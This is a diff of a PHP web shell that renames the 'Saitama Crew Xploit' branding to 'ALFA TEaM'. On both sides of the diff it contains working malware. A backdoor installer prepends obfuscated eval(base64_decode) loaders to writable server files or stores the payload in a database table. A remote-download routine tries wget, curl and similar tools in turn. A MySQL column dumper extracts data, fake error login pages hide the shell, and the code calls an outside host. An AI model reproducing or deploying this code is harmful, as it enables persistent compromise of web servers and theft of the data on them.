src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="alfaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
 @error_reporting(E_ALL ^ E_NOTICE);
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
@@ -1223,10 +1224,10 @@ echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_setting
 @ini_set('magic_quotes_runtime', 0);
 @set_time_limit(0);
 }}
-function saitamalogout(){
-@setcookie("saitamaUser", null, 2012);
-@setcookie("saitamaPass", null, 2012);
-unset($_COOKIE['saitamaUser'],$_COOKIE['saitamaPass']);
+function alfalogout(){
+@setcookie("AlfaUser", null, 2012);
+@setcookie("AlfaPass", null, 2012);
+unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass']);
 echo("ok");
 }
 function showAnimation($name){
@@ -1234,31 +1235,31 @@ function showAnimation($name){
 }
 function __showicon($r){
 	$s['btn']='http://solevisible.com/images/btn.png';
-	$s['saitamamini']='http://solevisible.com/images/saitamamini.png';
+	$s['alfamini']='http://solevisible.com/images/alfamini.png';
 	$s['loader']='http://solevisible.com/images/loader.svg';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
 	return $s[$r];
 }
-function saitamainbackdoor(){
-saitamahead();
+function alfainbackdoor(){
+alfahead();
 echo '<div class=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
 $error = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
 $success= '<font color="green">Success...!';
-$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Saitama Crew Xploit is Here...!');\n?></textarea></p></div>";
-$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='saitama'>Saitama Crew Xploit Uploader</option><option value='my'>My Private Shell</option></select>";
-$cwd = 'Example: /home/saitama/public_html/index.php';
-if($_POST['saitama1']=='file'){
-echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='saitama'> <input type='submit' value=' '>{$textarea}</form></p></center>");
-if($_POST['saitama2']!=''&&$_POST['saitama3']!=''&&$_POST['saitama4']!=''){
-$method = $_POST['saitama2'];
-$file = $_POST['saitama3'];
-$shell = $_POST['saitama4'];
-$key = str_replace(array('"','\''),'',trim($_POST['saitama5']));
-if($key=='')$key='saitama';
-if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__saitama_SHELL_CODE'];}
-$code = '<?php if(isset($_GET["saitama"])&&$_GET["saitama"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
-if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?saitama=".$key.'</font>');}else{__alert($error);}}}
-if($_POST['saitama1']=='db'){
+$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Alfa Team is Here...!');\n?></textarea></p></div>";
+$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Alfa Team Uploader</option><option value='my'>My Private Shell</option></select>";
+$cwd = 'Example: /home/alfa/public_html/index.php';
+if($_POST['alfa1']=='file'){
+echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='alfa'> <input type='submit' value=' '>{$textarea}</form></p></center>");
+if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa4']!=''){
+$method = $_POST['alfa2'];
+$file = $_POST['alfa3'];
+$shell = $_POST['alfa4'];
+$key = str_replace(array('"','\''),'',trim($_POST['alfa5']));
+if($key=='')$key='alfa';
+if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
+$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
+if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}
+if($_POST['alfa1']=='db'){
 echo("<center><p><div class='txtfont_header'>| In DataBase |</div></p>".getConfigHtml('all')."<p><form onsubmit=\"g('inbackdoor',null,'db',this.db_host.value,this.db_username.value,this.db_password.value,this.db_name.value,this.file.value,this.method.value,this.shell.value,this.key.value);return false;\">");
 $table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
@@ -1271,57 +1272,57 @@ array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', '
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'placeholder' => true),
 'td6' =>
-array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'saitama', 'inputSize' => '50')
+array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'alfa', 'inputSize' => '50')
 );
 create_table($table);
 echo("<p>{$select}</p>");
 echo($textarea);
 echo("<p><input type='submit' value=' '></p></form></p></center>");
-if($_POST['saitama2']!=''&&$_POST['saitama3']!=''&&$_POST['saitama5']!=''&&$_POST['saitama6']!=''){
-$dbhost = $_POST['saitama2'];
-$dbuser = $_POST['saitama3'];
-$dbpw = $_POST['saitama4'];
-$dbname = $_POST['saitama5'];
-$file = $_POST['saitama6'];
-$method = $_POST['saitama7'];
-$shell = $_POST['saitama8'];
-$key = str_replace(array('"','\''),'',trim($_POST['saitama9']));
-if($key=='')$key='saitama';
-if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__saitama_SHELL_CODE'];}
+if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa5']!=''&&$_POST['alfa6']!=''){
+$dbhost = $_POST['alfa2'];
+$dbuser = $_POST['alfa3'];
+$dbpw = $_POST['alfa4'];
+$dbname = $_POST['alfa5'];
+$file = $_POST['alfa6'];
+$method = $_POST['alfa7'];
+$shell = $_POST['alfa8'];
+$key = str_replace(array('"','\''),'',trim($_POST['alfa9']));
+if($key=='')$key='alfa';
+if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
 if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
-$code = '<?php if(isset($_GET["saitama"])&&$_GET["saitama"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM saitama_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
+$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM alfa_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
 if(@is_file($file)&&@is_writable($file)){
-@mysqli_query($conn,'DROP TABLE `saitama_bc`');
-@mysqli_query($conn,'CREATE TABLE `saitama_bc` (code LONGTEXT)');
-@mysqli_query($conn,'INSERT INTO `saitama_bc` VALUES("'.$shell.'")');
+@mysqli_query($conn,'DROP TABLE `alfa_bc`');
+@mysqli_query($conn,'CREATE TABLE `alfa_bc` (code LONGTEXT)');
+@mysqli_query($conn,'INSERT INTO `alfa_bc` VALUES("'.$shell.'")');
 @file_put_contents($file,$code."\n".@file_get_contents($file));
-__alert($success."<br>Run With: ".basename($file)."?saitama=".$key.'</font>');}else{__alert($error);}}}}
+__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}}
 echo('</div>');
-saitamafooter();
+alfafooter();
 }
-function saitamawhois(){
+function alfawhois(){
 echo("<div class='header'><center><p><div class='txtfont_header'>| Whois |</div></p><p><form onsubmit=\"g('whois',null,this.url.value,'>>');return false;\"><div class='txtfont'>Url: </div> <input type='text' name='url' style='text-align:center;' size='50' placeholder='google.com'> <input type='submit' value=' '></form></p></center>");
-if($_POST['saitama2']=='>>'&&!empty($_POST['saitama1'])){
-$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['saitama1']);
+if($_POST['alfa2']=='>>'&&!empty($_POST['alfa1'])){
+$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['alfa1']);
 $target = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
 $data = @file_get_contents($target);
-if($data==''){$get = new saitamaCURL();$get->ssl = true;$data = $get->Send($target);}
+if($data==''){$get = new AlfaCURL();$get->ssl = true;$data = $get->Send($target);}
 $target = @json_decode($data,true);
 echo __pre();
-if(is_array($target)){echo($target["whois_raw"]);}else{echo saitamaEx("whois ".$site);}}
+if(is_array($target)){echo($target["whois_raw"]);}else{echo alfaEx("whois ".$site);}}
 echo("</div>");
 }
-function saitamaremotedl(){
-saitamahead();
+function alfaremotedl(){
+alfahead();
 echo("<div class='header'><center><p><div class='txtfont_header'>| Upload From Url |</div></p><p>
 <form onsubmit=\"g('remotedl',null,this.d.value,this.p.value,'>>');return false;\">
 <p><div class='txtfont'>Url: </div>&nbsp;&nbsp;&nbsp;<input type='text' name='d' size='50'></p>
 <div class='txtfont'>Path:</div> <input type='text' name='p' size='50' value='".$GLOBALS['cwd']."'><p><input type='submit' value=' '></p>
 </form></p></center>");
-if(isset($_POST['saitama1'],$_POST['saitama2'],$_POST['saitama3'])&&!empty($_POST['saitama1'])&&$_POST['saitama3']=='>>'){
+if(isset($_POST['alfa1'],$_POST['alfa2'],$_POST['alfa3'])&&!empty($_POST['alfa1'])&&$_POST['alfa3']=='>>'){
 echo __pre();
-$url = $_POST['saitama1'];
-$path = $_POST['saitama2'];
+$url = $_POST['alfa1'];
+$path = $_POST['alfa2'];
 echo('<center>');
 if(__download($url,$path)){
 echo('<font color="green">Success...!</font>');
@@ -1331,7 +1332,7 @@ echo('<font color="red">Error...!</font>');
 echo('</center>');
 }
 echo("</div>");
-saitamafooter();
+alfafooter();
 }
 function __download($url,$path=false){
 if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
@@ -1340,19 +1341,19 @@ if($path){$saveas=$path.$saveas;}
 if($content = __read_file($url)){
 if(@is_file($saveas))@unlink($saveas);
 if(__write_file($saveas, $content)){return true;}}
-$buff = saitamaEx("wget ".$url." -O ".$saveas);
+$buff = alfaEx("wget ".$url." -O ".$saveas);
 if(@is_file($saveas)) return true;
-$buff = saitamaEx("curl ".$url." -o ".$saveas);
+$buff = alfaEx("curl ".$url." -o ".$saveas);
 if(@is_file($saveas)) return true;
-$buff = saitamaEx("lwp-download ".$url." ".$saveas);
+$buff = alfaEx("lwp-download ".$url." ".$saveas);
 if(@is_file($saveas)) return true;
-$buff = saitamaEx("lynx -source ".$url." > ".$saveas);
+$buff = alfaEx("lynx -source ".$url." > ".$saveas);
 if(@is_file($saveas)) return true;
-$buff = saitamaEx("GET ".$url." > ".$saveas);
+$buff = alfaEx("GET ".$url." > ".$saveas);
 if(@is_file($saveas)) return true;
-$buff = saitamaEx("links -source ".$url." > ".$saveas);
+$buff = alfaEx("links -source ".$url." > ".$saveas);
 if(@is_file($saveas)) return true;
-$buff = saitamaEx("fetch -o ".$saveas." -p ".$url);
+$buff = alfaEx("fetch -o ".$saveas." -p ".$url);
 if(@is_file($saveas)) return true;
 return false;
 }
@@ -1373,13 +1374,13 @@ $content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
 @fclose($fh);
 }
 if(empty($content)||!$content){
-	$content = saitamaEx("cat '".addslashes($file)."'");
+	$content = alfaEx("cat '".addslashes($file)."'");
 }
 return $content;
 }
-function saitamaMarket(){
+function alfaMarket(){
 echo "<div class='header'>";
-$curl = new saitamaCURL();
+$curl = new AlfaCURL();
 $content = $curl->Send("http://solevisible.com/market.php");
 $data = @json_decode($content, true);
 if(!empty($data)){
@@ -1389,15 +1390,15 @@ if($data["status"] == "open"){
 	echo $data["error_msg"];
 }
 }else{
-	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the saitama market....! try later.</div>";
+	echo "<div style='text-align:center;font-size:20px;'>Cant connect to the alfa market....! try later.</div>";
 }
 echo "</div>";
 }
-function saitamaSettings(){
-saitamahead();
-saitamaNum(6,7,8,9,10);
+function alfaSettings(){
+alfahead();
+AlfaNum(6,7,8,9,10);
 echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a></h3></center>';
-if($_POST["saitama8"] == "main"){
+if($_POST["alfa8"] == "main"){
 echo '<p><center><div class="txtfont_header">| Settings |</div></p><form onSubmit="reloadSetting(this);return false;" method=\'post\'>';
 $lg_array = array('0'=>'No','1'=>'Yes');
 $penc_array = array('false'=>'No','true'=>'Yes');
@@ -1408,22 +1409,22 @@ $login_html = "";
 $cgiapi_html = "";
 foreach($lg_array as $key=>$val)$protect_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$val.'</option>';
 foreach($lg_array as $key=>$val)$icon_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$val.'</option>';
-foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['saitama9'])&&$_POST['saitama9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['saitama9'])?'selected':'')).'>'.$val.'</option>';
-foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['saitama7'])&&$_POST['saitama7']==$key?"selected":(__saitama_POST_ENCRYPTION__&&empty($_POST['saitama7'])?'selected':'')).'>'.$val.'</option>';
+foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa9'])&&$_POST['alfa9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['alfa9'])?'selected':'')).'>'.$val.'</option>';
+foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['alfa7'])&&$_POST['alfa7']==$key?"selected":(__ALFA_POST_ENCRYPTION__&&empty($_POST['alfa7'])?'selected':'')).'>'.$val.'</option>';
 $lg_array = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound");
 foreach($lg_array as $key=>$val)$login_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['login_page']==$key?'selected':'').'>'.$val.'</option>';
 echo '';
-echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#00ffff">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00ffff">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00ffff">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00ffff">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#00ffff">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#00ffff">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['saitama3'])?$GLOBALS['DB_NAME']['user']:$_POST['saitama3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#00ffff">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
-if($_POST['saitama5']=='>>'){
+echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
+if($_POST['alfa5']=='>>'){
 echo __pre();
-if(!empty($_POST['saitama3'])){
-$protect = $_POST['saitama1'];
-$lgpage = $_POST['saitama2'];
-$username = $_POST['saitama3'];
-$password = md5($_POST['saitama4']);
-$icon = $_POST['saitama6'];
-$post_encrypt = $_POST['saitama7'];
-$cgi_api_val = $_POST['saitama9'];
+if(!empty($_POST['alfa3'])){
+$protect = $_POST['alfa1'];
+$lgpage = $_POST['alfa2'];
+$username = $_POST['alfa3'];
+$password = md5($_POST['alfa4']);
+$icon = $_POST['alfa6'];
+$post_encrypt = $_POST['alfa7'];
+$cgi_api_val = $_POST['alfa9'];
 @chdir($GLOBALS['home_cwd']);
 $basename = @basename($_SERVER['PHP_SELF']);
 $data = @file_get_contents($basename);
@@ -1445,7 +1446,7 @@ if(!empty($username)&&preg_match($find_user,$data,$e)){
 $new = '\''.$user_rand.'\' => \''.$username.'\',';
 $data = str_replace($e[0],$new,$data);
 }
-if(!empty($_POST['saitama4'])&&preg_match($find_pw,$data,$e)){
+if(!empty($_POST['alfa4'])&&preg_match($find_pw,$data,$e)){
 $new = '\''.$pass_rand.'\' => \''.$password.'\',';
 $data = str_replace($e[0],$new,$data);
 }
@@ -1470,7 +1471,7 @@ $new = '\''.$cgi_api_rand.'\' => '.$cgi_api_val.',';
 $data = str_replace($e[0],$new,$data);
 }
 if(@file_put_contents($basename,$data)){
-echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['saitama4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
+echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['alfa4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
 }else{
 __alert("<span style='color:red;'>File has no edit access...!</span>");
 }
@@ -1478,29 +1479,29 @@ __alert("<span style='color:red;'>File has no edit access...!</span>");
 __alert("<span style='color:red;'>UserName is Empty !</span>");
 }
 }
-}elseif($_POST["saitama8"] == "color"){
+}elseif($_POST["alfa8"] == "color"){
 echo('<center><p><div class="txtfont_header">| Custom Color |</div></p><form onSubmit="reloadColors();return false;" method=\'post\'>');
 echo '<table border="1"><tbody>';
-$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00ffff">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#00ffff" value="{color}"></td></tr>';
+$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
 $x = 1;
-foreach($GLOBALS['__saitama_COLOR__'] as $key => $value){
+foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
 	$multi = "";
 	if(is_array($value)){
 		if(isset($value["multi_selector"])){
 			$multi = __ZW5jb2Rlcg(json_encode($value));
 		}
 	}
-	$value = saitama_getColor($key);
+	$value = alfa_getColor($key);
 	$help = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $key));
 	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($x++, $key, $value, $multi, $help), $template);
 }
 echo '<tr><td style="text-align:center;">-</td><td style="text-align:center;"><div class="tbltxt">*</div></td><td><div style="margin-left:5px;" class="tbltxt">Use Default Color:</div></td><td></td><td><center><input type="checkbox" id="use_default_color" value="1"></center></td></tr>';
 
 echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();" class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
-if($_POST['saitama7']=='export'){
+if($_POST['alfa7']=='export'){
 	echo __pre();
 	$colors = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
-	$glob_colors = $GLOBALS["__saitama_COLOR__"];
+	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
 	$array = array();
 	foreach($glob_colors as $k => $v){
 		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
@@ -1510,7 +1511,7 @@ if($_POST['saitama7']=='export'){
 		}
 		$array[$k] = $v;
 	}
-	$file = "saitama_color_config_".date('Y-m-d-h_i_s').".conf";
+	$file = "alfa_color_config_".date('Y-m-d-h_i_s').".conf";
 	$config = json_encode($array, JSON_PRETTY_PRINT);
 	if(!@file_put_contents($file, $config)){
 		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
@@ -1518,12 +1519,12 @@ if($_POST['saitama7']=='export'){
 		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
 	}
 }
-if($_POST['saitama2']=='>>'){
+if($_POST['alfa2']=='>>'){
 	echo __pre();
-	$colors = json_decode($_POST["saitama1"],true);
+	$colors = json_decode($_POST["alfa1"],true);
 	$array = "";
-	$is_default = isset($_POST["saitama3"])&&$_POST["saitama3"]=="1"?true:false;
-	$glob_colors = $GLOBALS["__saitama_COLOR__"];
+	$is_default = isset($_POST["alfa3"])&&$_POST["alfa3"]=="1"?true:false;
+	$glob_colors = $GLOBALS["__ALFA_COLOR__"];
 	foreach($glob_colors as $k => $v){
 		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
 			$v = trim($colors[$k]);
@@ -1550,42 +1551,42 @@ if($_POST['saitama2']=='>>'){
 }
 }
 echo('</div>');
-saitamafooter();
+alfafooter();
 }
-function saitamaaboutus(){
-saitamahead();
+function alfaaboutus(){
+alfahead();
 echo '<div class="header">';
-$news = new saitamaCURL();
+$news = new AlfaCURL();
 $about_us = $news->Send("http://solevisible.com/aboutus.php");
 if(empty($about_us)){
 $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.png'><br>
 <b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
-<font color='#00A220'>Shell Coded By Ndraa & StrezzBoy (Saitama Crew Xploit)</font><br>
+<font color='#00A220'>Shell Coded By Sole Sad & Invisible (ALFA TEaM)</font><br>
 <font color='#00A220'>Contact : solevisible@gmail.com</font><br>
 <font color='#00A220'>Telegram Channel: @solevisible</font><br>
-<font color='#00ffff'>Skype : ehsan.StrezzBoy</font><br>
-<font color='#00ffff'>Skype : sole.sad</font><br>
-<font color='#E6E6FA'>Persian Gulf For Ever</font><br>
-<font color='#E6E6FA'>Iranian Programmers</font><br>
-<font color='#E6E6FA'>############</font><br>
+<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
+<font color='#FFFFFF'>Skype : sole.sad</font><br>
+<font color='#FF0000'>Persian Gulf For Ever</font><br>
+<font color='#FF0000'>Iranian Programmers</font><br>
+<font color='#FF0000'>############</font><br>
 </center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
 }
 echo __pre().$about_us;
 echo('</div>');
-saitamafooter();
+alfafooter();
 }
-function saitamacoldumper(){
-saitamahead();
+function alfacoldumper(){
+alfahead();
 echo('<div class="header">');
-saitamaNum(8,9,10);
+AlfaNum(8,9,10);
 echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
-$delimiter = (!empty($_POST['saitama1']) ? $_POST['saitama1'] : '::');
-$selected_data = json_decode($_POST['saitama2'], true);
-$username = ($_POST['saitama3']);
-$password = ($_POST['saitama4']);
-$dbname = ($_POST['saitama5']);
-$dfile = ($_POST['saitama6']);
-$host = ($_POST['saitama7']);
+$delimiter = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');
+$selected_data = json_decode($_POST['alfa2'], true);
+$username = ($_POST['alfa3']);
+$password = ($_POST['alfa4']);
+$dbname = ($_POST['alfa5']);
+$dfile = ($_POST['alfa6']);
+$host = ($_POST['alfa7']);
 $table = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $host, 'inputSize' => '50'),
  'td2' =>
@@ -1646,7 +1647,7 @@ if(count($selected_data) > 0){
 			$tbls .= "Done ~~~> ".$file_name."<br>";
 		}
 		echo __pre();
-		echo "<center><font color='#00ffff'>".$tbls."</font></center>";
+		echo "<center><font color='#00FF00'>".$tbls."</font></center>";
 	}
 }
 if(!empty($dbname) && count($selected_data) == 0){
@@ -1670,9 +1671,9 @@ if($db){
 
 	echo '<ul id="myUL">';
 	foreach($data as $tbl => $cols){
-	    echo '<li><span style="color:#00ffff;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
+	    echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
 	    foreach($cols["cols"] as $col){
-	        echo '<li tbl="'.$tbl.'"><span style="color:#00ffff;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
+	        echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
 	    }
 	    echo '</ul></li>';
 	}
@@ -1682,12 +1683,12 @@ echo('<center>mysqli_connect : Error!</center>');
 }
 }
 echo('</div>');
-saitamafooter();
